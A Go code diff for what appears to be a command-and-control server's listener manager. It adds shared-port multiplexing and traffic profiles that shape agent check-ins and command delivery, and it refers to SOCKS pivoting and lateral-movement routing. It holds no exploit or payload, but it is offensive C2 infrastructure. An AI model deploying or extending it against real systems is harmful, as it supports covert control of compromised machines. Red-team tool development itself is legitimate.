@@ -47,6 +47,10 @@ type Manager struct {
 	asyncEnabled      bool              // Add this flag for async processing
 	heartbeatBatcher  *HeartbeatBatcher // Batches lastSEEN updates to reduce DB load
 	linkRouting       *LinkRouting      // Manages SMB link routing for lateral movement
+
+	// Shared port management - allows multiple listeners on the same port
+	sharedPorts    map[int]*SharedPortServer // Port -> shared server
+	listenerToPort map[string]int            // Listener name -> port number
 }
 
 // NewManagerWithOptions creates a manager with optional configurations
@@ -74,6 +78,8 @@ func NewManagerWithOptions(
 		socksRoutes:       NewSocksRoutes(),
 		asyncEnabled:      false,
 		heartbeatBatcher:  NewHeartbeatBatcher(db, 5*time.Second), // Batch every 5 seconds
+		sharedPorts:       make(map[int]*SharedPortServer),
+		listenerToPort:    make(map[string]int),
 	}
 
 	// Start the heartbeat batcher background process
@@ -113,6 +119,44 @@ func NewManager(
 }
 
 func (m *Manager) createHTTPHandler(cfg config.ListenerConfig) http.Handler {
+	// Look up bound profiles for this listener
+	var getProfile *config.GetProfile
+	var postProfile *config.PostProfile
+	var serverResponseProfile *config.ServerResponseProfile
+
+	if cfg.GetProfile != "" {
+		getProfile = m.routes.GetGetProfile(cfg.GetProfile)
+		if getProfile != nil {
+			log.Printf("[Listener %s] Using GET profile: %s (path: %s, method: %s)",
+				cfg.Name, getProfile.Name, getProfile.Path, getProfile.Method)
+		} else {
+			log.Printf("[Listener %s] Warning: GET profile %s not found, using global routes",
+				cfg.Name, cfg.GetProfile)
+		}
+	}
+
+	if cfg.PostProfile != "" {
+		postProfile = m.routes.GetPostProfile(cfg.PostProfile)
+		if postProfile != nil {
+			log.Printf("[Listener %s] Using POST profile: %s (path: %s, method: %s)",
+				cfg.Name, postProfile.Name, postProfile.Path, postProfile.Method)
+		} else {
+			log.Printf("[Listener %s] Warning: POST profile %s not found, using global routes",
+				cfg.Name, cfg.PostProfile)
+		}
+	}
+
+	if cfg.ServerResponseProfile != "" {
+		serverResponseProfile = m.routes.GetServerResponseProfile(cfg.ServerResponseProfile)
+		if serverResponseProfile != nil {
+			log.Printf("[Listener %s] Using server response profile: %s (content-type: %s)",
+				cfg.Name, serverResponseProfile.Name, serverResponseProfile.ContentType)
+		} else {
+			log.Printf("[Listener %s] Warning: server response profile %s not found, using defaults",
+				cfg.Name, cfg.ServerResponseProfile)
+		}
+	}
+
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		log.Printf("[%s] Received request to %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
 
@@ -130,11 +174,18 @@ func (m *Manager) createHTTPHandler(cfg config.ListenerConfig) http.Handler {
 			w.Header().Set(k, v)
 		}
 
-		// Check GET handlers (which may use custom methods)
-		for _, handler := range m.routes.Routes.Get {
-			// Check if the path matches AND the method matches (custom or default)
-			if handler.Path == r.URL.Path && handler.Method == r.Method && handler.Enabled {
-				log.Printf("[%s] Found matching GET-type handler for path %s", r.Method, r.URL.Path)
+		// If listener has a bound GET profile, use it
+		if getProfile != nil {
+			if getProfile.Path == r.URL.Path && getProfile.Method == r.Method {
+				log.Printf("[%s] Matched GET profile %s for path %s", r.Method, getProfile.Name, r.URL.Path)
+
+				// Convert profile params to handler format for extractClientID
+				handler := config.Handler{
+					Path:    getProfile.Path,
+					Method:  getProfile.Method,
+					Enabled: true,
+					Params:  getProfile.Params,
+				}
 
 				clientID, err := m.extractClientID(r, handler)
 				if err != nil {
@@ -142,7 +193,37 @@ func (m *Manager) createHTTPHandler(cfg config.ListenerConfig) http.Handler {
 					return
 				}
 
-				// Use GET request handler (since this is a GET-type operation)
+				// Use profile-aware GET request handler
+				m.handleGetRequestWithProfile(w, clientID, m.commandBuffer, serverResponseProfile)
+				return
+			}
+		}
+
+		// If listener has a bound POST profile, use it
+		if postProfile != nil {
+			if postProfile.Path == r.URL.Path && postProfile.Method == r.Method {
+				log.Printf("[%s] Matched POST profile %s for path %s", r.Method, postProfile.Name, r.URL.Path)
+
+				// Use POST request handler with the bound profile
+				m.handlePostRequestWithProfile(w, r, postProfile)
+				return
+			}
+		}
+
+		// Fallback to global routes if no profile matched
+		// Check GET handlers (which may use custom methods)
+		for _, handler := range m.routes.Routes.Get {
+			// Check if the path matches AND the method matches (custom or default)
+			if handler.Path == r.URL.Path && handler.Method == r.Method && handler.Enabled {
+				log.Printf("[%s] Found matching GET-type handler for path %s (global route)", r.Method, r.URL.Path)
+
+				clientID, err := m.extractClientID(r, handler)
+				if err != nil {
+					http.Error(w, err.Error(), http.StatusBadRequest)
+					return
+				}
+
+				// Use original GET request handler for global routes
 				m.handleGetRequest(w, clientID, m.commandBuffer)
 				return
 			}
@@ -152,7 +233,7 @@ func (m *Manager) createHTTPHandler(cfg config.ListenerConfig) http.Handler {
 		for _, handler := range m.routes.Routes.Post {
 			// Check if the path matches AND the method matches (custom or default)
 			if handler.Path == r.URL.Path && handler.Method == r.Method && handler.Enabled {
-				log.Printf("[%s] Found matching POST-type handler for path %s", r.Method, r.URL.Path)
+				log.Printf("[%s] Found matching POST-type handler for path %s (global route)", r.Method, r.URL.Path)
 
 				// Use POST request handler (since this is a POST-type operation)
 				m.handlePostRequest(w, r)
@@ -165,10 +246,18 @@ func (m *Manager) createHTTPHandler(cfg config.ListenerConfig) http.Handler {
 
 		// Check if this method is even allowed
 		allowed := false
-		for _, handler := range m.routes.Routes.Get {
-			if handler.Enabled && handler.Method == r.Method {
-				allowed = true
-				break
+		if getProfile != nil && getProfile.Method == r.Method {
+			allowed = true
+		}
+		if postProfile != nil && postProfile.Method == r.Method {
+			allowed = true
+		}
+		if !allowed {
+			for _, handler := range m.routes.Routes.Get {
+				if handler.Enabled && handler.Method == r.Method {
+					allowed = true
+					break
+				}
 			}
 		}
 		if !allowed {
@@ -187,6 +276,161 @@ func (m *Manager) createHTTPHandler(cfg config.ListenerConfig) http.Handler {
 			log.Printf("[%s] Path not found: %s", r.Method, r.URL.Path)
 			http.Error(w, "Not found", http.StatusNotFound)
 		}
+	})
+}
+
+// createListenerHandler builds a ListenerHandler for a listener config
+func (m *Manager) createListenerHandler(cfg config.ListenerConfig) *ListenerHandler {
+	handler := &ListenerHandler{
+		ListenerName:   cfg.Name,
+		Headers:        cfg.Headers,
+		AllowedMethods: cfg.AllowedMethods,
+	}
+
+	// Look up bound profiles
+	if cfg.GetProfile != "" {
+		handler.GetProfile = m.routes.GetGetProfile(cfg.GetProfile)
+		if handler.GetProfile != nil {
+			log.Printf("[Listener %s] Handler using GET profile: %s (path: %s, method: %s)",
+				cfg.Name, handler.GetProfile.Name, handler.GetProfile.Path, handler.GetProfile.Method)
+		}
+	}
+
+	if cfg.PostProfile != "" {
+		handler.PostProfile = m.routes.GetPostProfile(cfg.PostProfile)
+		if handler.PostProfile != nil {
+			log.Printf("[Listener %s] Handler using POST profile: %s (path: %s, method: %s)",
+				cfg.Name, handler.PostProfile.Name, handler.PostProfile.Path, handler.PostProfile.Method)
+		}
+	}
+
+	if cfg.ServerResponseProfile != "" {
+		handler.ServerResponseProfile = m.routes.GetServerResponseProfile(cfg.ServerResponseProfile)
+		if handler.ServerResponseProfile != nil {
+			log.Printf("[Listener %s] Handler using server response profile: %s",
+				cfg.Name, handler.ServerResponseProfile.Name)
+		}
+	}
+
+	return handler
+}
+
+// createSharedPortHandler creates a multiplexing HTTP handler for a shared port
+// that routes requests to the appropriate listener based on URL path matching
+func (m *Manager) createSharedPortHandler(sps *SharedPortServer) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		log.Printf("[SharedPort:%d] Received %s request to %s from %s",
+			sps.Port, r.Method, r.URL.Path, r.RemoteAddr)
+
+		// Check for SOCKS WebSocket upgrade first (shared across all listeners)
+		if m.socksRoutes != nil {
+			if socksHandler := m.socksRoutes.GetHandler(r.URL.Path); socksHandler != nil {
+				log.Printf("[SharedPort:%d] SOCKS handler found for path: %s", sps.Port, r.URL.Path)
+				socksHandler(w, r)
+				return
+			}
+		}
+
+		// Look up which listener should handle this request
+		listenerName, handler, found := sps.LookupListener(r.Method, r.URL.Path)
+		if found {
+			log.Printf("[SharedPort:%d] Routing %s %s to listener '%s'",
+				sps.Port, r.Method, r.URL.Path, listenerName)
+
+			// Get the listener config for additional settings
+			cfg, _ := sps.GetListenerConfig(listenerName)
+
+			// Apply listener-specific headers
+			for k, v := range handler.Headers {
+				w.Header().Set(k, v)
+			}
+
+			// Route based on which profile matched
+			if handler.GetProfile != nil &&
+				handler.GetProfile.Path == r.URL.Path &&
+				handler.GetProfile.Method == r.Method {
+				// This is a GET-type request - retrieve commands
+				profileHandler := config.Handler{
+					Path:    handler.GetProfile.Path,
+					Method:  handler.GetProfile.Method,
+					Enabled: true,
+					Params:  handler.GetProfile.Params,
+				}
+
+				clientID, err := m.extractClientID(r, profileHandler)
+				if err != nil {
+					log.Printf("[SharedPort:%d] Failed to extract client ID: %v", sps.Port, err)
+					http.Error(w, err.Error(), http.StatusBadRequest)
+					return
+				}
+
+				m.handleGetRequestWithProfile(w, clientID, m.commandBuffer, handler.ServerResponseProfile)
+				return
+			}
+
+			if handler.PostProfile != nil &&
+				handler.PostProfile.Path == r.URL.Path &&
+				handler.PostProfile.Method == r.Method {
+				// This is a POST-type request - agent sending data
+				m.handlePostRequestWithProfile(w, r, handler.PostProfile)
+				return
+			}
+
+			// Shouldn't reach here if LookupListener found a match, but handle it
+			log.Printf("[SharedPort:%d] Warning: Found listener but no profile match", sps.Port)
+			_ = cfg // Silence unused variable warning
+		}
+
+		// No direct profile match - try global routes for all registered listeners
+		// This handles cases where listeners use global routes instead of bound profiles
+		for _, listenerName := range sps.GetListenerNames() {
+			cfg, exists := sps.GetListenerConfig(listenerName)
+			if !exists {
+				continue
+			}
+
+			handler := sps.listenerHandlers[listenerName]
+
+			// Apply headers
+			for k, v := range handler.Headers {
+				w.Header().Set(k, v)
+			}
+
+			// Check global GET routes
+			for _, route := range m.routes.Routes.Get {
+				if route.Path == r.URL.Path && route.Method == r.Method && route.Enabled {
+					log.Printf("[SharedPort:%d] Matched global GET route for listener '%s'",
+						sps.Port, listenerName)
+
+					clientID, err := m.extractClientID(r, route)
+					if err != nil {
+						http.Error(w, err.Error(), http.StatusBadRequest)
+						return
+					}
+
+					// Use original handler for global routes
+					m.handleGetRequest(w, clientID, m.commandBuffer)
+					return
+				}
+			}
+
+			// Check global POST routes
+			for _, route := range m.routes.Routes.Post {
+				if route.Path == r.URL.Path && route.Method == r.Method && route.Enabled {
+					log.Printf("[SharedPort:%d] Matched global POST route for listener '%s'",
+						sps.Port, listenerName)
+
+					m.handlePostRequest(w, r)
+					return
+				}
+			}
+
+			_ = cfg // Silence unused variable
+		}
+
+		// No handler found
+		log.Printf("[SharedPort:%d] No handler found for %s %s", sps.Port, r.Method, r.URL.Path)
+		http.Error(w, "Not found", http.StatusNotFound)
 	})
 }
 
@@ -239,13 +483,18 @@ func (m *Manager) startServerGoroutine(server *http.Server, cfg config.ListenerC
 }
 
 // StartListener creates and starts a listener based on the given configuration
+// Supports shared ports: multiple listeners can share the same port if their
+// profile paths don't conflict
 func (m *Manager) StartListener(cfg config.ListenerConfig) error {
 	m.mutex.Lock()
 	defer m.mutex.Unlock()
 
-	// Check for existing listener
+	// Check if listener name already exists
 	if _, exists := m.listeners[cfg.Name]; exists {
 		return fmt.Errorf("listener with name %s already exists", cfg.Name)
+	}
+	if _, exists := m.listenerToPort[cfg.Name]; exists {
+		return fmt.Errorf("listener with name %s already exists on shared port", cfg.Name)
 	}
 
 	// Set allowed methods if not already set
@@ -258,29 +507,116 @@ func (m *Manager) StartListener(cfg config.ListenerConfig) error {
 		cfg.Headers = m.routes.GetHeaders()
 	}
 
-	// Create handler
-	handler := m.createHTTPHandler(cfg)
+	// Create the listener handler (contains profile bindings)
+	listenerHandler := m.createListenerHandler(cfg)
 
-	// Create server
-	server, err := m.createServer(cfg, handler)
-	if err != nil {
-		return fmt.Errorf("failed to create server: %v", err)
+	// Check if port already has a shared server
+	sps, portInUse := m.sharedPorts[cfg.Port]
+
+	if portInUse {
+		// Port already in use - verify protocol matches
+		if sps.Protocol != cfg.Protocol {
+			return fmt.Errorf("port %d already in use by %s listener, cannot share with %s",
+				cfg.Port, sps.Protocol, cfg.Protocol)
+		}
+
+		// Check for path conflicts
+		if hasConflict, msg := sps.HasPathConflict(listenerHandler); hasConflict {
+			return fmt.Errorf("cannot add listener to port %d: %s", cfg.Port, msg)
+		}
+
+		// Register this listener on the existing shared port
+		if err := sps.RegisterListener(cfg.Name, listenerHandler, cfg); err != nil {
+			return fmt.Errorf("failed to register listener on shared port: %v", err)
+		}
+
+		// Track the listener->port mapping
+		m.listenerToPort[cfg.Name] = cfg.Port
+
+		log.Printf("[LISTENER] %s added to shared port %d (%s) - total listeners on port: %d",
+			cfg.Name, cfg.Port, cfg.Protocol, sps.GetListenerCount())
+		return nil
 	}
 
-	// Start server goroutine
+	// No existing shared server on this port - create a new one
+	sps = NewSharedPortServer(cfg.Port, cfg.Protocol)
+
+	// Setup TLS if HTTPS
+	if cfg.Protocol == "HTTPS" {
+		tlsConfig, err := m.setupTLSConfig(cfg)
+		if err != nil {
+			return fmt.Errorf("failed to setup TLS: %v", err)
+		}
+		sps.TLSConfig = tlsConfig
+	}
+
+	// Register this listener on the new shared port
+	if err := sps.RegisterListener(cfg.Name, listenerHandler, cfg); err != nil {
+		return fmt.Errorf("failed to register listener: %v", err)
+	}
+
+	// Create http.Server with the multiplexing handler
+	server := &http.Server{
+		Addr:      fmt.Sprintf("0.0.0.0:%d", cfg.Port),
+		Handler:   m.createSharedPortHandler(sps),
+		TLSConfig: sps.TLSConfig,
+	}
+	sps.Server = server
+
+	// Start the server
 	m.startServerGoroutine(server, cfg)
 
-	// Store the listener
-	m.listeners[cfg.Name] = server
+	// Store references
+	m.sharedPorts[cfg.Port] = sps
+	m.listenerToPort[cfg.Name] = cfg.Port
 
+	log.Printf("[LISTENER] %s started on new shared port %d (%s)",
+		cfg.Name, cfg.Port, cfg.Protocol)
 	return nil
 }
 
 // StopListener stops an active listener by name
+// For listeners on shared ports, only unregisters from the port; the server
+// continues running until the last listener is removed
 func (m *Manager) StopListener(name string) error {
 	m.mutex.Lock()
 	defer m.mutex.Unlock()
 
+	// First check if this is on a shared port
+	port, onSharedPort := m.listenerToPort[name]
+	if onSharedPort {
+		sps, portExists := m.sharedPorts[port]
+		if !portExists {
+			// Inconsistent state - clean up the mapping
+			delete(m.listenerToPort, name)
+			return fmt.Errorf("listener %s references non-existent shared port %d", name, port)
+		}
+
+		// Unregister the listener from the shared port
+		sps.UnregisterListener(name)
+		delete(m.listenerToPort, name)
+
+		log.Printf("[LISTENER] %s removed from shared port %d (remaining: %d)",
+			name, port, sps.GetListenerCount())
+
+		// If the shared port is now empty, shut down the server
+		if sps.IsEmpty() {
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			defer cancel()
+
+			if err := sps.Server.Shutdown(ctx); err != nil {
+				log.Printf("[LISTENER] Failed to shutdown shared port %d server: %v", port, err)
+				return err
+			}
+
+			delete(m.sharedPorts, port)
+			log.Printf("[LISTENER] Shared port %d shut down (no more listeners)", port)
+		}
+
+		return nil
+	}
+
+	// Legacy path: standalone listener (not on shared port)
 	listener, exists := m.listeners[name]
 	if !exists {
 		return fmt.Errorf("listener %s does not exist", name)
@@ -300,11 +636,27 @@ func (m *Manager) StopListener(name string) error {
 	return nil
 }
 
-// StopAll stops all active listeners
+// StopAll stops all active listeners (both shared port and standalone)
 func (m *Manager) StopAll() {
 	m.mutex.Lock()
 	defer m.mutex.Unlock()
 
+	// Stop all shared port servers
+	for port, sps := range m.sharedPorts {
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		if err := sps.Server.Shutdown(ctx); err != nil {
+			log.Printf("[LISTENER] Shared port %d stop failed: %v", port, err)
+		} else {
+			log.Printf("[LISTENER] Shared port %d stopped (had %d listeners)",
+				port, sps.GetListenerCount())
+		}
+		cancel()
+	}
+	// Clear shared port maps
+	m.sharedPorts = make(map[int]*SharedPortServer)
+	m.listenerToPort = make(map[string]int)
+
+	// Stop all standalone listeners
 	for name, listener := range m.listeners {
 		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 		if err := listener.Shutdown(ctx); err != nil {
@@ -565,9 +917,12 @@ func (m *Manager) LoadInitData() error {
 func (m *Manager) StartExistingListeners() error {
 	log.Println("[StartExistingListeners] Checking for existing listeners in database...")
 
-	// Query for all listeners (no 'active' column exists in the schema)
+	// Query for all listeners including profile bindings
 	rows, err := m.db.Query(`
-		SELECT name, protocol, port, ip 
+		SELECT name, protocol, port, ip,
+			COALESCE(get_profile, 'default-get'),
+			COALESCE(post_profile, 'default-post'),
+			COALESCE(server_response_profile, 'default-response')
 		FROM listeners
 	`)
 	if err != nil {
@@ -576,22 +931,29 @@ func (m *Manager) StartExistingListeners() error {
 	defer rows.Close()
 
 	var listeners []struct {
-		name     string
-		protocol string
-		port     string // Note: port is VARCHAR in the database
-		bindIP   string
+		name                  string
+		protocol              string
+		port                  string // Note: port is VARCHAR in the database
+		bindIP                string
+		getProfile            string
+		postProfile           string
+		serverResponseProfile string
 	}
 
 	// Collect all listeners from database
 	for rows.Next() {
 		var l struct {
-			name     string
-			protocol string
-			port     string // Changed to string to match DB schema
-			bindIP   string
+			name                  string
+			protocol              string
+			port                  string // Changed to string to match DB schema
+			bindIP                string
+			getProfile            string
+			postProfile           string
+			serverResponseProfile string
 		}
 
-		if err := rows.Scan(&l.name, &l.protocol, &l.port, &l.bindIP); err != nil {
+		if err := rows.Scan(&l.name, &l.protocol, &l.port, &l.bindIP,
+			&l.getProfile, &l.postProfile, &l.serverResponseProfile); err != nil {
 			log.Printf("[StartExistingListeners] Failed to scan listener row: %v", err)
 			continue
 		}
@@ -623,16 +985,19 @@ func (m *Manager) StartExistingListeners() error {
 			continue
 		}
 
-		log.Printf("[StartExistingListeners] Attempting to start listener: %s (%s) on %s:%d",
-			l.name, l.protocol, l.bindIP, port)
+		log.Printf("[StartExistingListeners] Attempting to start listener: %s (%s) on %s:%d, Profiles: GET=%s POST=%s Response=%s",
+			l.name, l.protocol, l.bindIP, port, l.getProfile, l.postProfile, l.serverResponseProfile)
 
-		// Create listener configuration
+		// Create listener configuration with profile bindings
 		listenerCfg := config.ListenerConfig{
-			Name:     l.name,
-			Protocol: l.protocol,
-			Port:     port,
-			BindIP:   l.bindIP,
-			Secure:   l.protocol == "HTTPS",
+			Name:                  l.name,
+			Protocol:              l.protocol,
+			Port:                  port,
+			BindIP:                l.bindIP,
+			Secure:                l.protocol == "HTTPS",
+			GetProfile:            l.getProfile,
+			PostProfile:           l.postProfile,
+			ServerResponseProfile: l.serverResponseProfile,
 		}
 
 		// Attempt to start the listener
